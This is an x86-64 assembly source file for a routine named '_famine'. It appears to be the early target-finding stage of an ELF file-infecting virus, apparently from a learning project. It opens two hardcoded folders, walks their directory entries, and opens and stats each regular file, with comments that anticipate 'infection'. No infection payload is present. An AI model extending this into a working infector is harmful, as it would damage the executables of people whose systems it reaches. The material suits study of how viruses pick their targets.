%include "header.asm"
[BITS 64]

extern xprintf

section .text
    global _famine

_famine:
    ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
    push rbp
    mov rbp, rsp
    rel_init
    sub rsp, FILE_SIZE + DIRENT + FSTAT
    mov r10, 1

target_dir:
    cmp r10, 1
    je .f1
    cmp r10, 0
    je .f2
    .f1:
        lea rdi, [rel(hook.folder_1)]
        jmp open_dir
    .f2:
        mov r10, 0
        lea rdi, [rel(hook.folder_2)]

open_dir:
    mov rsi, 0                                         ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                                         ; Quit if cannot OPEN
    jle next_dir    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                                       ; offset struct dirent
    mov rdx, 1024
    syscall
    mov r8, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                                       ; buffer offset

find_file:
    cmp rbx, r8
    jge next_dir
    lea rsi, [rsp + 256]                               ; struct
    add rsi, rbx                                       ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                                ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]

target_file:
    ; push qword [rbx]
    mov rax, rdi
    lea rdi, [rsp]
    cmp r10, 1
    je .ff1
    cmp r10, 0
    je .ff2
    .ff1:
        lea rsi, [rel(hook.folder_1)]
        jmp .path_dir
    .ff2:
        lea rsi, [rel(hook.folder_2)]
    .path_dir:
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file
%ifdef DEBUG
    lea rdi, [rsp]
    sub rcx, rcx
    sub al, al
    not rcx
    cld
    repne scasb
    not rcx
    dec rcx
    mov [rsp + rcx + 1], byte 0x0                       ; Work because we do not use dirent for now.
    dbgs [rel(hook.target)], [rsp]
%endif


validate_target:
    lea rdi, [rsp]                                      ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x0                                        ; O_RDONLY
    syscall
    cmp al, 0
    jle next_file
    mov rdi, rax
    mov rsi, rsp
    add rsi, FILE_SIZE + DIRENT
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jl next_file
%ifdef DEBUG
    dbg [rel(hook.fz)], [rsp + FILE_SIZE + DIRENT + 48] ; st_size
%endif

next_file:
    ; maybe RBX not valid anymore aswell.
    ; pop rbx
    mov rcx, FILE_SIZE
    memset [rsp], rcx                                       ; FILESIZE memset
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

next_dir:
    mov rcx, rbx                    ; maybe push RBX before
    memset [rsp + 256], rcx         ; DIRENT_BUF memset
    .next:
        cmp r10, 1
        jge target_dir.f2

quit:
    mov rax, SYS_EXIT
    mov rdi, 0
    syscall

hook:
    .folder_1:
        db FOLDER_1, 0
    .folder_2:
        db FOLDER_2, 0
%ifdef DEBUG
    .newline:
        db 0xa, 0
    .fz:
        db "Filesize : 0x%x", 0xa, 0
    .target:
        db "Target_file : %s", 0xa, 0
    .string:
        db "%s", 0xa, 0
    .number:
        db "%x", 0xa, 0
%endif